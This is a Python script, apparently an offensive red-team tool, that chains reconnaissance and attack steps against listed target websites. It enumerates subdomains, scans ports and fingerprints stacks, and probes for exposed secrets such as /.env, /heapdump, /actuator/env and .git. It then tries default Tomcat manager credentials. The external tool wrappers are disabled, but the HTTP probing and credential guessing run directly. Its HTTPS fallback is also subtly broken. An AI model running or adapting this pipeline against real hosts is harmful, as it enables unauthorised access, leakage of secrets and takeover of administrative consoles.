#!/usr/bin/env python3
"""
攻击流水线 v3.0
①→②→②.⑤→③→④→⑤→⑥→⑦→⑦.⑤→⑧→⑨
每步双工具, 全异常保护, 统一速率
"""
import subprocess, sys, os, time, ssl, hashlib, base64
import urllib.request

TOOLS_DIR = os.path.dirname(os.path.abspath(__file__)) + "/tools"
TARGETS = "D:/Desktop/all_alive.txt"
INNER_DELAY = 0.5
RATE = 2.0
ctx = ssl._create_unverified_context()

def ts(): return time.strftime("%H:%M:%S")

def safe_run(cmd, timeout=300, cwd=None, desc=""):
    """Legacy execution is intentionally disabled; use gov_exercise_runner."""
    print(f"  [{ts()}] legacy execution blocked: {desc or str(cmd)[:80]}")
    print("    请改用 gov_exercise_runner.py；该旧入口不会启动外部命令。")
    return None

def get_targets(f):
    t = []
    for l in open(f,'r',encoding='utf-8'):
        l = l.strip()
        if l and not l.startswith('#') and '|' in l:
            p = l.split('|')
            u = p[0].strip()
            n = p[1].strip() if len(p)>1 else u
            if not u.startswith('http'): u = 'https://'+u
            t.append((u,n))
    return t

def http_get(url, timeout=5):
    try:
        import socket
        req = urllib.request.Request(url)
        socket.setdefaulttimeout(timeout)
        return urllib.request.urlopen(req, timeout=timeout, context=ctx)
    except:
        if url.startswith('https://'):
            try:
                return urllib.request.urlopen(
                    urllib.request.Request(url.replace('https://','http')),
                    timeout=timeout, context=ctx)
            except: pass
        return None

def step1_subdomain(targets_file):
    print(f"\n{'='*50}\n① 子域名 [{ts()}]\n{'='*50}")
    domains = set()
    for l in open(targets_file,'r',encoding='utf-8'):
        if '|' in l:
            h = l.split('|')[0].strip()
            if '://' in h: h = h.split('://')[1]
            h = h.split('/')[0].split(':')[0]
            if '.' in h and not h.replace('.','').isdigit(): domains.add(h)
    domains = sorted(domains)[:10]
    print(f"  主域名: {len(domains)}个")
    for d in domains:
        print(f"  [{d}]")
        ofa = f"{TOOLS_DIR}/oneforall/oneforall.py"
        if os.path.exists(ofa):
            safe_run(f"python {ofa} --target {d} run", timeout=300, desc=f"OneForAll {d}")
        ksub = f"{TOOLS_DIR}/ksubdomain_bin/ksubdomain.exe"
        if os.path.exists(ksub):
            safe_run(f'"{ksub}" enum -d {d} --band 1m --filter-wild -o D:/Desktop/ksub_{d}.txt', timeout=120, desc=f"ksubdomain {d}")
        time.sleep(RATE)
    print(f"  ①完成 [{ts()}]")

def step2_alive(targets_file):
    print(f"\n{'='*50}\n② 存活探测 [{ts()}]\n{'='*50}")
    targets = get_targets(targets_file)
    alive = []
    for url, name in targets:
        r = http_get(url)
        if r: alive.append(f"{url}|{name}"); print(f"  [+] {name}")
        time.sleep(RATE)
    out = targets_file.replace('.txt','_alive.txt')
    with open(out,'w',encoding='utf-8') as f: f.write('\n'.join(alive))
    print(f"  存活 {len(alive)}/{len(targets)} -> {out}")
    print(f"  ②完成 [{ts()}]")
    return out

def step2_5_ports(alive_file):
    print(f"\n{'='*50}\n②.⑤ 端口扫描 [{ts()}]\n{'='*50}")
    try: subprocess.run(["nmap","--version"], capture_output=True, timeout=5)
    except: print("  nmap未安装,跳过"); return
    ips = set()
    for l in open(alive_file,'r',encoding='utf-8'):
        if '|' in l:
            h = l.split('|')[0].strip()
            if '://' in h: h = h.split('://')[1]
            h = h.split('/')[0].split(':')[0]
            if h.replace('.','').isdigit(): ips.add(h)
    ips = sorted(ips)[:20]
    print(f"  IP: {len(ips)}个")
    for ip in ips:
        safe_run(f"nmap -T2 --open -p 80,443,8080,8443,8000,8888,9000,9090,7001,28088 {ip}", timeout=120, desc=f"nmap {ip}")
        time.sleep(RATE)
    print(f"  ②.⑤完成 [{ts()}]")

def step3_fingerprint(alive_file):
    print(f"\n{'='*50}\n③ 指纹(双工具) [{ts()}]\n{'='*50}")
    # 3a. EHole
    ehole = f"{TOOLS_DIR}/ehole.exe"
    if os.path.exists(ehole):
        safe_run(f'"{ehole}" finger -l {alive_file} -t 10', timeout=300, desc="EHole指纹(10线程)")
    else:
        print("  EHole未找到,跳过")
    # 3b. TideFinger
    tide = f"{TOOLS_DIR}/tidefinger.exe"
    if not os.path.exists(tide):
        # 天狐原路径
        tide_th = "D:/Desktop/天狐渗透工具箱-社区版V3.0+4.0更新升级包/天狐渗透工具箱-社区版V3.0/tools/gui_shouji/tide/TideFinger_windows_amd64_v3.2.3.exe"
        if os.path.exists(tide_th): tide = tide_th
    if os.path.exists(tide):
        safe_run(f'"{tide}" -l {alive_file}', timeout=300, desc="TideFinger")
    else:
        print("  TideFinger未找到,跳过")
    print(f"  ③完成 [{ts()}]")

def step4_5_deep(alive_file):
    print(f"\n{'='*50}\n④ 分类 + ⑤ 深度扫描 [{ts()}]\n{'='*50}")
    targets = get_targets(alive_file)
    java_t, dotnet_t, oa_t, php_t = [], [], [], []
    for url, name in targets:
        r = http_get(url)
        if not r: continue
        try:
            c = r.getheader('Set-Cookie','') or ''
            xp = r.getheader('X-Powered-By','') or ''
            body = r.read().decode('utf-8','ignore')[:2000]
            if 'JSESSIONID' in c or 'rememberMe' in c: java_t.append((url,name))
            elif '.NET' in xp or 'ASP.NET' in xp or 'ASPXAUTH' in c: dotnet_t.append((url,name))
            elif 'seeyon' in body.lower() or '致远' in body.lower(): oa_t.append((url,name))
            elif 'PHPSESSID' in c: php_t.append((url,name))
        except: pass
        time.sleep(RATE)
    for cat, lst in [('JAVA',java_t),('NET',dotnet_t),('OA',oa_t),('PHP',php_t)]:
        with open(f'D:/Desktop/cat_{cat}.txt','w',encoding='utf-8') as f:
            for url,name in lst: f.write(f'{url}|{name}\n')
    print(f"  JAVA:{len(java_t)} .NET:{len(dotnet_t)} OA:{len(oa_t)} PHP:{len(php_t)}")

    # 深度
    print(f"\n  ⑤-JAVA 深度")
    for url,name in java_t:
        for p in ['/druid/index.html','/actuator/env','/swagger-ui.html','/manager/html','/heapdump']:
            r = http_get(url+p, timeout=4)
            if r:
                try:
                    c = r.getheader('Set-Cookie','') or ''
                    body = r.read().decode('utf-8','ignore')[:300]
                    if r.status==200 and len(body)>20:
                        if 'rememberMe' in c: print(f"    [Shiro!] {name}")
                        if p=='/manager/html': print(f"    [TomcatMgr] {name}")
                        if p=='/swagger-ui.html': print(f"    [Swagger] {name}")
                        if p=='/heapdump': print(f"    [Heapdump] {name}")
                except: pass
            time.sleep(INNER_DELAY)
        time.sleep(RATE)

    print(f"\n  ⑤-.NET 深度")
    for url,name in dotnet_t:
        for p in ['/web.config','/trace.axd','/elmah']:
            r = http_get(url+p, timeout=4)
            if r: print(f"    [{p}] {name}")
            time.sleep(INNER_DELAY)
        time.sleep(RATE)

    print(f"\n  ⑤-OA 深度")
    for url,name in oa_t:
        print(f"    [OA] {name}")
        oaexp = f"{TOOLS_DIR}/OA-EXPTOOL/scan.py"
        if os.path.exists(oaexp):
            safe_run(f"python {oaexp} -u {url}", timeout=120, cwd=f"{TOOLS_DIR}/OA-EXPTOOL", desc=f"OA-EXPTOOL {name}")
        time.sleep(RATE)
    print(f"  ④⑤完成 [{ts()}]")

def step6_verify(alive_file):
    print(f"\n{'='*50}\n⑥ 真伪验证 [{ts()}]\n{'='*50}")
    targets = get_targets(alive_file)
    checks = [('/manager/html','Apache Tomcat'),('/druid/index.html','Druid Stat'),
              ('/actuator/env','propertySources'),('/swagger-ui.html','swagger'),
              ('/v2/api-docs','paths'),('/web.config','<configuration'),
              ('/trace.axd','Trace'),('/elmah','Error Log'),('/.env','APP_KEY'),
              ('/.git/HEAD','ref:'),('/heapdump','JAVA PROFILE')]
    real = []
    for url,name in targets:
        hr = http_get(url)
        if not hr: continue
        try:
            home = hr.read().decode('utf-8','ignore')[:2000]
            home_sig = hashlib.md5(home[:300].encode()).hexdigest()
        except: continue
        for path,kw in checks:
            r = http_get(url.rstrip('/')+path, timeout=4)
            if not r: continue
            try:
                body = r.read().decode('utf-8','ignore')[:2000]
                cur_sig = hashlib.md5(body[:300].encode()).hexdigest()
                if cur_sig != home_sig and kw.lower() in body.lower():
                    real.append(f'{url}|{name}|{path}|{len(body)}bytes')
                    print(f"  [OK] {name}: {path} ({len(body)}b)")
                    break
            except: pass
            time.sleep(INNER_DELAY)
        time.sleep(RATE)
        sys.stdout.flush()
    with open('D:/Desktop/verified_vulns.txt','w',encoding='utf-8') as f: f.write('\n'.join(real))
    print(f"  真实: {len(real)}/{len(targets)} -> D:/Desktop/verified_vulns.txt")
    print(f"  ⑥完成 [{ts()}]")

def step7_vuln(alive_file):
    print(f"\n{'='*50}\n⑦ 漏洞探测(双工具) [{ts()}]\n{'='*50}")
    afrog = f"{TOOLS_DIR}/afrog.exe"
    if os.path.exists(afrog):
        targets = get_targets(alive_file)
        os.makedirs('D:/Desktop/afrog_results', exist_ok=True)
        print(f"  [Afrog] {len(targets)}个目标...")
        for i,(url,name) in enumerate(targets):
            out = f'D:/Desktop/afrog_results/{i:03d}_{url.split("://")[1].split("/")[0][:30]}.html'
            safe_run(f'"{afrog}" -t {url} -o {out}', timeout=180, desc=f"Afrog[{i+1}/{len(targets)}] {name}")
            time.sleep(RATE)
    else: print("  Afrog未找到,跳过")
    # Nuclei
    for np in [f"{TOOLS_DIR}/nuclei.exe", f"{TOOLS_DIR}/nuclei/bin/nuclei.exe"]:
        if os.path.exists(np):
            safe_run(f'"{np}" -l {alive_file} -s medium,high,critical -o D:/Desktop/nuclei_result.txt', timeout=3600, desc="Nuclei")
            break
    else: print("  Nuclei未找到,跳过")
    print(f"  ⑦完成 [{ts()}]")

def step7_5_dirscan(alive_file):
    print(f"\n{'='*50}\n⑦.⑤ 目录爆破 [{ts()}]\n{'='*50}")
    ds = None
    for c in [f"{TOOLS_DIR}/dirsearch/dirsearch.py",
              "D:/Desktop/天狐渗透工具箱-社区版V3.0+4.0更新升级包/天狐渗透工具箱-社区版V3.0/tools/gui_scan/dirsearch/dirsearch.py"]:
        if os.path.exists(c): ds = c; break
    if not ds: print("  dirsearch未找到,跳过"); return
    targets = get_targets(alive_file)
    for url,name in targets[:10]:
        safe_run(f"python {ds} -u {url} -e php,asp,aspx,jsp,bak,zip,sql --random-agent -t 5 -q", timeout=180, desc=f"dirsearch {name}")
        time.sleep(RATE)
    print(f"  ⑦.⑤完成 [{ts()}]")

def step8_exploit():
    print(f"\n{'='*50}\n⑧ 可利用性 [{ts()}]\n{'='*50}")
    if not os.path.exists('D:/Desktop/verified_vulns.txt'): print("  须先跑⑥"); return
    for l in open('D:/Desktop/verified_vulns.txt','r',encoding='utf-8'):
        p = l.strip().split('|')
        if len(p)<3: continue
        url, name, path = p[0], p[1], p[2]
        if 'manager/html' in path:
            for u,pa in [('tomcat','tomcat'),('admin','admin'),('manager','manager')]:
                try:
                    auth = base64.b64encode(f'{u}:{pa}'.encode()).decode()
                    r = urllib.request.urlopen(urllib.request.Request(url,
                        headers={'Authorization':f'Basic {auth}'}), timeout=5, context=ctx)
                    body = r.read().decode('utf-8','ignore')[:500]
                    if r.status==200 and len(body)>200 and 'Tomcat' in body:
                        print(f"  [!!!] {name} Tomcat登录: {u}/{pa}")
                except: pass
                time.sleep(0.5)
    print(f"  ⑧完成 [{ts()}]")

def step9_report():
    print(f"\n{'='*50}\n⑨ 报告 [{ts()}]\n{'='*50}")
    lines = ["="*60, "  攻击流水线 v3.0 扫描报告", f"  时间: {time.strftime('%Y-%m-%d %H:%M:%S')}", "="*60, ""]
    for f,label in [('D:/Desktop/all_alive_alive.txt','②存活'),('D:/Desktop/verified_vulns.txt','⑥真实漏洞')]:
        if os.path.exists(f):
            n = sum(1 for _ in open(f,'r',encoding='utf-8') if _.strip())
            lines.append(f"{label}: {n}条")
    for cat in ['JAVA','NET','OA','PHP']:
        cf = f'D:/Desktop/cat_{cat}.txt'
        if os.path.exists(cf):
            n = sum(1 for _ in open(cf,'r',encoding='utf-8') if _.strip())
            lines.append(f"④{cat}: {n}个")
    if os.path.exists('D:/Desktop/verified_vulns.txt'):
        for l in open('D:/Desktop/verified_vulns.txt','r',encoding='utf-8'):
            p = l.strip().split('|')
            if len(p)>=3: lines.append(f"  [{p[1][:20]}] {p[2]}")
    report = '\n'.join(lines)
    with open('D:/Desktop/scan_report.txt','w',encoding='utf-8') as f: f.write(report)
    print(report); print(f"  ⑨完成 [{ts()}]")

def pipeline(targets_file):
    print(f"\n{'#'*60}\n#  攻击流水线 v3.0  目标间隔:{RATE}s  请求间隔:{INNER_DELAY}s\n{'#'*60}")
    alive = step2_alive(targets_file)
    step2_5_ports(alive)
    step3_fingerprint(alive)
    step4_5_deep(alive)
    step6_verify(alive)
    step7_vuln(alive)
    step7_5_dirscan(alive)
    step8_exploit()
    step9_report()
    print(f"\n{'#'*60}\n#  流水线完成 [{ts()}]\n{'#'*60}")

if __name__ == "__main__":
    print(
        "[LEGACY WARNING] scanner.py is a legacy aggressive pipeline. "
        "Prefer gov_exercise_runner.py for controlled background runs.",
        file=sys.stderr,
    )
    USAGE = """攻击流水线 v3.0
  python scanner.py pipeline <file>  完整流水线
  python scanner.py all              默认目标
  python scanner.py verify <file>    ⑥真伪验证
  python scanner.py vuln <file>      ⑦漏洞探测
  python scanner.py report           ⑨报告
  --rate 2.0 --inner 0.5            速率控制"""
    if len(sys.argv)<2: print(USAGE); sys.exit(0)
    for opt in ['--rate','--inner']:
        if opt in sys.argv:
            i = sys.argv.index(opt)
            if opt=='--rate': RATE = float(sys.argv[i+1])
            else: INNER_DELAY = float(sys.argv[i+1])
            del sys.argv[i:i+2]
    cmd, arg = sys.argv[1], sys.argv[2] if len(sys.argv)>2 else TARGETS
    if   cmd=="pipeline": pipeline(arg)
    elif cmd=="all": a=step2_alive(TARGETS); step4_5_deep(a); step6_verify(a); step9_report()
    elif cmd=="sub": step1_subdomain(arg)
    elif cmd=="alive": step2_alive(arg)
    elif cmd=="ports": step2_5_ports(arg)
    elif cmd=="deep": step4_5_deep(arg)
    elif cmd=="verify": step6_verify(arg)
    elif cmd=="vuln": step7_vuln(arg)
    elif cmd=="dirscan": step7_5_dirscan(arg)
    elif cmd=="exploit": step8_exploit()
    elif cmd=="report": step9_report()
    elif cmd=="finger": step3_fingerprint(arg)
    elif cmd=="oa": safe_run(f"python {TOOLS_DIR}/OA-EXPTOOL/scan.py -u {arg}", timeout=300)
    elif cmd=="shiro": safe_run(f"java -jar {TOOLS_DIR}/shiro/*.jar {arg}", timeout=120)
    elif cmd=="fastjson": safe_run(f"java -jar {TOOLS_DIR}/fastjson/*.jar {arg}", timeout=120)
    elif cmd=="weak": safe_run(f'{TOOLS_DIR}/weekpasswd.exe -u {arg}', timeout=300)
    else: print(f"未知: {cmd}")
